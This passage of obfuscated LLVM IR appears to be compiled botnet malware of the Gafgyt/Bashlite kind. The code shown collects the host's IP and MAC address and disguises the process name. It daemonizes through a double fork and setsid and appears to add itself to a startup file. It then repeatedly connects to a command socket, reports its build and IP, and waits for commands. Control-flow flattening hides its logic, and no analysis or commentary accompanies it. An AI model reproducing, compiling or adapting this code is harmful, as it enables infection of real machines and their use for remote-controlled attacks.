  store i32 -34862282, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1709084163, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1709084163, label %first
    i32 456039841, label %16
    i32 -2022249587, label %17
    i32 594046746, label %31
    i32 1754651112, label %32
    i32 1009997135, label %39
    i32 -1545795976, label %40
    i32 1100314202, label %45
    i32 -1605627455, label %51
    i32 120494011, label %56
    i32 1731004983, label %58
    i32 -1573203224, label %64
    i32 746881521, label %67
    i32 630267805, label %69
    i32 1728936213, label %71
    i32 1509121885, label %78
    i32 739570045, label %86
    i32 -984660843, label %90
    i32 -754862099, label %102
    i32 1297358436, label %105
    i32 -87199711, label %106
    i32 -1247738096, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 456039841, i32 -2022249587
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1247738096, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.538, i32 0, i32 0)) #2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 594046746, i32 1754651112
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1247738096, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #2
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 1009997135, i32 -1545795976
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1247738096, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.539, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 1100314202, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 -1605627455, i32 1728936213
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.540, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 120494011, i32 630267805
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 1731004983, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 -1573203224, i32 746881521
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 1731004983, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 1728936213, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 1100314202, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 1509121885, i32 -87199711
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.5* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #2
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  store i32 739570045, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 -984660843, i32 1297358436
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.6* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 -754862099, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 739570045, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -87199711, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -1247738096, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.541, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca %struct._IO_FILE*
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i64 %40) #2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #2
  %49 = xor i32 %47, %48
  call void @srand(i32 %49) #2
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = call i32 @getpid() #2
  %52 = xor i32 %50, %51
  call void @init_rand(i32 %52)
  store i32 0, i32* %10, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.543, i32 0, i32 0), i8** %12, align 8
  %53 = load i8*, i8** %12, align 8
  %54 = call %struct._IO_FILE* @fopen(i8* %53, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store %struct._IO_FILE* %54, %struct._IO_FILE** %13, align 8
  %55 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  store %struct._IO_FILE* %55, %struct._IO_FILE** %.reg2mem
  %switchVar = alloca i32
  store i32 -1869271455, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i1
  %.reg2mem6 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1869271455, label %first
    i32 594633610, label %58
    i32 -1414095294, label %61
    i32 -387141096, label %65
    i32 1181613573, label %77
    i32 1722708081, label %78
    i32 616055236, label %89
    i32 779349130, label %92
    i32 -694931837, label %102
    i32 -999107302, label %108
    i32 -636936867, label %117
    i32 1329529907, label %120
    i32 -142938021, label %121
    i32 715967664, label %125
    i32 560265151, label %133
    i32 942366488, label %139
    i32 -1823360115, label %140
    i32 -355511921, label %143
    i32 1699370647, label %144
    i32 -1108452179, label %147
    i32 -1373716996, label %148
    i32 1467017958, label %153
    i32 -1896659599, label %156
    i32 -290081048, label %160
    i32 1201641543, label %164
    i32 786171409, label %165
    i32 523439499, label %169
    i32 -1493246867, label %170
    i32 -557440454, label %172
    i32 -299909150, label %173
    i32 223470817, label %174
    i32 -223045025, label %176
    i32 -2127815471, label %177
    i32 -1084556205, label %181
    i32 -689206484, label %185
    i32 267856674, label %187
    i32 -1612085, label %193
    i32 1124154579, label %199
    i32 -590235769, label %200
    i32 -736396843, label %206
    i32 -813726360, label %215
    i32 672779516, label %218
    i32 -1810200626, label %224
    i32 260254613, label %235
    i32 -1262529150, label %238
    i32 -918527744, label %251
    i32 -1933347591, label %257
    i32 -1262039723, label %267
    i32 -13109776, label %270
    i32 -1114407372, label %274
    i32 1727582732, label %275
    i32 -174612467, label %278
    i32 -1304585779, label %288
    i32 1443603002, label %291
    i32 -1477229293, label %297
    i32 1014875889, label %304
    i32 -2103849843, label %305
    i32 -59904667, label %306
    i32 1716031623, label %313
    i32 723768058, label %316
    i32 -266470291, label %322
    i32 636867547, label %327
    i32 -424821792, label %329
    i32 -2070814426, label %332
    i32 175854301, label %338
    i32 721575141, label %339
    i32 -531975491, label %348
    i32 -2021383633, label %358
    i32 1687076547, label %367
    i32 -1559267271, label %369
    i32 1775745969, label %375
    i32 574314623, label %377
    i32 1764637561, label %383
    i32 -789181262, label %388
    i32 -644839036, label %390
    i32 1114097761, label %393
    i32 2044390061, label %398
    i32 1676448717, label %403
    i32 236920226, label %412
    i32 -1984763118, label %417
    i32 1642030782, label %421
    i32 608244034, label %422
    i32 -1371086162, label %429
    i32 100350340, label %435
    i32 450806807, label %442
    i32 1489929746, label %445
    i32 -1199951636, label %450
    i32 1040039334, label %454
    i32 -55813385, label %460
    i32 -97818647, label %483
    i32 -753406958, label %485
    i32 -248966815, label %491
    i32 1430062831, label %492
    i32 -577648622, label %497
    i32 -705358599, label %502
    i32 -967408304, label %505
    i32 -842979195, label %506
    i32 1341377150, label %507
    i32 685755957, label %508
    i32 152567482, label %509
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  %56 = icmp eq %struct._IO_FILE* %.reload, null
  %57 = select i1 %56, i32 594633610, i32 -1414095294
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.545, i32 0, i32 0), i8** %12, align 8
  %59 = load i8*, i8** %12, align 8
  %60 = call %struct._IO_FILE* @fopen(i8* %59, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store %struct._IO_FILE* %60, %struct._IO_FILE** %13, align 8
  store i32 -1414095294, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %63 = icmp ne %struct._IO_FILE* %62, null
  %64 = select i1 %63, i32 -387141096, i32 -1373716996
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i64 @strlen(i8* %68) #10
  %70 = trunc i64 %69 to i32
  store i32 %70, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %72 = call i8* @getcwd(i8* %71, i64 256) #2
  %73 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %74 = call i32 @strcmp(i8* %73, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i32 0, i32 0)) #10
  %75 = icmp ne i32 %74, 0
  %76 = select i1 %75, i32 1181613573, i32 1699370647
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 1722708081, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 0
  %81 = load i8*, i8** %80, align 8
  %82 = load i32, i32* %16, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i8, i8* %84, align 1
  %86 = sext i8 %85 to i32
  %87 = icmp ne i32 %86, 47
  %88 = select i1 %87, i32 616055236, i32 779349130
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i32, i32* %16, align 4
  %91 = add nsw i32 %90, -1
  store i32 %91, i32* %16, align 4
  store i32 1722708081, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %94 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = load i32, i32* %16, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %97, i64 %99
  %101 = call i32 (i8*, i8*, ...) @sprintf(i8* %93, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.547, i32 0, i32 0), i8* %94, i8* %100) #2
  store i32 -694931837, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %104 = call i32 @feof(%struct._IO_FILE* %103) #2
  %105 = icmp ne i32 %104, 0
  %106 = xor i1 %105, true
  %107 = select i1 %106, i32 -999107302, i32 -142938021
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %110 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %111 = call i8* @fgets(i8* %109, i32 1024, %struct._IO_FILE* %110)
  %112 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %113 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %114 = call i32 @strcasecmp(i8* %112, i8* %113) #10
  %115 = icmp ne i32 %114, 0
  %116 = select i1 %115, i32 1329529907, i32 -636936867
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %17, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %17, align 4
  store i32 1329529907, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -694931837, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %17, align 4
  %123 = icmp eq i32 %122, 0
  %124 = select i1 %123, i32 715967664, i32 -1823360115
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %127 = call i32 @fclose(%struct._IO_FILE* %126)
  %128 = load i8*, i8** %12, align 8
  %129 = call %struct._IO_FILE* @fopen(i8* %128, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.548, i32 0, i32 0))
  store %struct._IO_FILE* %129, %struct._IO_FILE** %18, align 8
  %130 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %131 = icmp ne %struct._IO_FILE* %130, null
  %132 = select i1 %131, i32 560265151, i32 942366488
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %135 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %136 = call i32 @fputs(i8* %134, %struct._IO_FILE* %135)
  %137 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %138 = call i32 @fclose(%struct._IO_FILE* %137)
  store i32 942366488, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  store i32 -355511921, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %142 = call i32 @fclose(%struct._IO_FILE* %141)
  store i32 -355511921, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  store i32 -1108452179, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %146 = call i32 @fclose(%struct._IO_FILE* %145)
  store i32 -1108452179, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -1373716996, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = call i32 @getOurIP()
  %150 = call i32 @fork() #2
  store i32 %150, i32* %7, align 4
  %151 = icmp ne i32 %150, 0
  %152 = select i1 %151, i32 1467017958, i32 -1896659599
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %7, align 4
  %155 = call i32 @waitpid(i32 %154, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %7, align 4
  %158 = icmp ne i32 %157, 0
  %159 = select i1 %158, i32 223470817, i32 -290081048
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call i32 @fork() #2
  store i32 %161, i32* %8, align 4
  %162 = icmp ne i32 %161, 0
  %163 = select i1 %162, i32 1201641543, i32 786171409
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32, i32* %8, align 4
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 -1493246867, i32 523439499
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  store i32 -557440454, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.549, i32 0, i32 0))
  store i32 -557440454, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  store i32 -299909150, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  store i32 -223045025, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.549, i32 0, i32 0))
  store i32 -223045025, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 -2127815471, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = call i32 @setsid() #2
  %179 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i32 0, i32 0)) #2
  %180 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  store i32 -1084556205, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = call i32 @initConnection()
  %183 = icmp ne i32 %182, 0
  %184 = select i1 %183, i32 -689206484, i32 267856674
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = call i32 @sleep(i32 30)
  store i32 -1084556205, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i32, i32* @mainCommSock, align 4
  %189 = call i8* @getBuild()
  %190 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %191 = call i8* @inet_ntoa(i32 %190) #2
  %192 = call i32 (i32, i8*, ...) @sockprintf(i32 %188, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.550, i32 0, i32 0), i8* %189, i8* %191)
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  store i32 -1612085, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i32, i32* @mainCommSock, align 4
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %196 = call i32 @recvLine(i32 %194, i8* %195, i32 4096)
  store i32 %196, i32* %20, align 4
  %197 = icmp ne i32 %196, -1
  %198 = select i1 %197, i32 1124154579, i32 685755957
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  store i32 0, i32* %21, align 4
  store i32 -590235769, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i32, i32* %21, align 4
  %202 = sext i32 %201 to i64
  %203 = load i64, i64* @numpids, align 8
  %204 = icmp ult i64 %202, %203
  %205 = select i1 %204, i32 -736396843, i32 -174612467
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i32*, i32** @pids, align 8
  %208 = load i32, i32* %21, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds i32, i32* %207, i64 %209
  %211 = load i32, i32* %210, align 4
  %212 = call i32 @waitpid(i32 %211, i32* null, i32 1)
  %213 = icmp sgt i32 %212, 0
  %214 = select i1 %213, i32 -813726360, i32 -1114407372
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i32, i32* %21, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %23, align 4
  store i32 672779516, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %23, align 4
  %220 = zext i32 %219 to i64
  %221 = load i64, i64* @numpids, align 8
  %222 = icmp ult i64 %220, %221
  %223 = select i1 %222, i32 -1810200626, i32 -1262529150
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i32*, i32** @pids, align 8
  %226 = load i32, i32* %23, align 4
  %227 = zext i32 %226 to i64
  %228 = getelementptr inbounds i32, i32* %225, i64 %227
  %229 = load i32, i32* %228, align 4
  %230 = load i32*, i32** @pids, align 8
  %231 = load i32, i32* %23, align 4
  %232 = sub i32 %231, 1
  %233 = zext i32 %232 to i64
  %234 = getelementptr inbounds i32, i32* %230, i64 %233
  store i32 %229, i32* %234, align 4
  store i32 260254613, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i32, i32* %23, align 4
  %237 = add i32 %236, 1
  store i32 %237, i32* %23, align 4
  store i32 672779516, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i32*, i32** @pids, align 8
  %240 = load i32, i32* %23, align 4
  %241 = sub i32 %240, 1
  %242 = zext i32 %241 to i64
  %243 = getelementptr inbounds i32, i32* %239, i64 %242
  store i32 0, i32* %243, align 4
  %244 = load i64, i64* @numpids, align 8
  %245 = add i64 %244, -1
  store i64 %245, i64* @numpids, align 8
  %246 = load i64, i64* @numpids, align 8
  %247 = add i64 %246, 1
  %248 = mul i64 %247, 4
  %249 = call noalias i8* @malloc(i64 %248) #2
